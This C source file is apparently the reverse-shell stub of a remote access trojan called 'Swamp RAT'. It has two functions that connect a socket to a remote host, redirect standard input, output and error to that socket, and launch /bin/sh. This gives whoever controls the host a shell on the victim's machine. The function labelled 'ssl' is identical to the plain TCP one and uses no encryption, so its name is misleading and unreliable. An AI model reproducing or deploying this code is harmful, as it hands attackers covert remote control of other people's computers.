// Swamp RAT Stub Reverse Shell

#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdbool.h>
#include "../defs.h"

extern char **environ;

bool shell_reverse_tcp(char *host, int host_port){
  /*
    :TODO: send reverse shell
    :host: domain or ip address
    :host_port: host port
    :returns: bool
  */
  int sockfd;
  if (strlen(host) > MAX_DOMAIN_LEN){
    fprintf(stderr, "error: invalid ip or domain length\n");
    return false;
  }
  if (host_port > TCP_PORT_MAX || host_port <= TCP_PORT_MIN){
    fprintf(stderr, "error: invalid port number\n");
    return false;
  }
  struct sockaddr_in srv_addr;
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_port = htons(host_port);
  srv_addr.sin_addr.s_addr = inet_addr(host);
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
  for (int i = 0; i <= 2; i++){
    dup2(sockfd, i);
  }
  execve("/bin/sh",
         (char *[]){"bin/sh", 0},
         environ);
  return true;
}

bool shell_reverse_ssl(char *host, int host_port){
  /*
    :TODO: send reverse shell
    :host: domain or ip address
    :host_port: host port
    :returns: bool
  */
  int sockfd;
  if (strlen(host) > MAX_DOMAIN_LEN){
    fprintf(stderr, "error: invalid ip or domain length\n");
    return false;
  }
  if (host_port > TCP_PORT_MAX || host_port <= TCP_PORT_MIN){
    fprintf(stderr, "error: invalid port number\n");
    return false;
  }
  struct sockaddr_in srv_addr;
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_port = htons(host_port);
  srv_addr.sin_addr.s_addr = inet_addr(host);
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
  for (int i = 0; i <= 2; i++){
    dup2(sockfd, i);
  }
  execve("/bin/sh",
         (char *[]){"bin/sh", 0},
         environ);
  return true;
}
